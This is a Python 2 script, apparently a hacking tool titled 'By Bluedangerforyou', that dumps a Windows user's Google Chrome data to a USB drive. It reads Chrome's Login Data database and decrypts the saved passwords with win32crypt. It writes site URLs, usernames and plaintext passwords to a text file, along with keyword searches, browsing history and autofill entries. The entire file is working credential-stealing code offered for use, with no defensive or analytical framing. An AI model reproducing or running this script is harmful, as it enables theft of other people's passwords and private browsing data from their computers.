from __future__ import print_function
import os
from os import getenv
import sqlite3
import win32crypt
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

print ("""

           XMC)?MMMMMMMMMMMMMMMhX?!?MMMMX#MM!MXMMMMMMMMMMMML   '~
   '\      MMMMMMMMMMMMMMMMMMMMMMMM!~`````-`~!?MMMM)MMMMMMMMx
      `~""MMM)MMMMMMMMMMMMMMMHhHH!~           `#MM(MMMMMMMMMM>
         HM!HMMMMMMMMMMMMMMMM*?)?`                `"MMMMMMMMMX       .
        XM!MMMMMMMMMMMMMMMMMMM?~                     'MMMMMMMM:..xx!`
        M!MMMMMMMMMMMMMMMMMXH!                        MMMMXMMP"`
       \!MMMMMMMSMHHHMM?XMM?~    -:::xx..             M?XMM?".x(
       MXMMMMMMMMMM!XHMMMM":       ... `"%x          XHHHMMM*"
      \!MMMMMMMM?XMMMMMMX!'~L     '%%%+:.  `       ..MMMMM"
      'HMMMMMM?HMMMMM*XM!    h     ~\).^\~     .%""`MM?"
      'MMMMMMMMMMMMMXMMM!    -X               +%%!.MMMXk
      ?MMMMMMMMMMMXMMMMM `.   ~               `""'XMMMMX
      !MMMMMMMMMMMMMMMMMX.    '                  XMkMMX>
      XMMMMMMMMMMMMMMM?MXXXx.-`                  XXMMM!
      MMMMMMMMMMMMMMMMXMXXXXXXx.         ~~      MMMMM
      XMMMMMMMMMMMM?MMXXXXXXXXX!`         '+^  .MMM!P
      'MMM!MMMMMMMMMi?M!"`        `~%HHHHxx.  xMMMM"
      :MMMMMMMMMMMMMMM"               `\XMM .MMMMM
      XMMMMMMMMMX?MM!                   `( HMMMMM
     XMMMM)MMM"   \~                     'MMMMM*
    'MMMMfMMM"  \~                        XMMM*
   .MMMMMXMM"  ^                          `MMM
By Bluedangerforyou
""")
print("GOOGLE CHROME MUST NOT BE OPEN OR TOOL WILL HANG")
print ("Enter your USB Drive Letter with colon. Example G: ")
usb = raw_input('USB Drive Letter: ')
os.makedirs(usb + "//Chrome Dump")
username1 = "Username: "
siteId = "Site ID: "
password_field = "Password: "
f = open(usb + "//Chrome Dump//passwordsusers.txt", "w")
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
conn3 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\History")
conn1 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
conn4 = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data")
cursor3 = conn3.cursor()
cursor1 = conn1.cursor()
cursor4 = conn4.cursor()
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	if password:
		f.writelines(siteId + result[0] + '\n' + username1 + result[1] + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')

print("We've collected saved usernames and passwords")		
f1 = open(usb + '//Chrome Dump//keywordsearches.txt','w')		
cursor3.execute("SELECT * FROM keyword_search_terms") 
print("We've collected Google Keyword Searches")
result3 = cursor3.fetchall() 
for r3 in result3:
        #print (r3[2] + '\n')
        f1.writelines(str(r3[2] + '\n'))
        
        
f2 = open(usb + '//Chrome Dump//history.txt', 'w')
cursor3.execute("SELECT * FROM urls") 
print("We've collected Google History")
result4 = cursor3.fetchall() 
for r4 in result4:
        f2.writelines(str('\n' + r4[1] + '\n'))

f6 = open(usb + '//Chrome Dump//autofill.txt','w')
cursor4.execute("SELECT * FROM autofill")
print("We've collected autofill info:")
result1 = cursor4.fetchall() 
for r6 in result1:
	f6.writelines(str('\n' + r6[0] + ":       "+ r6[2]))

f.close()
f1.close()
f2.close()
f6.close()
print("Chrome Dump directory and files have been created on your USB")
raw_input("Press Enter to close the tool")
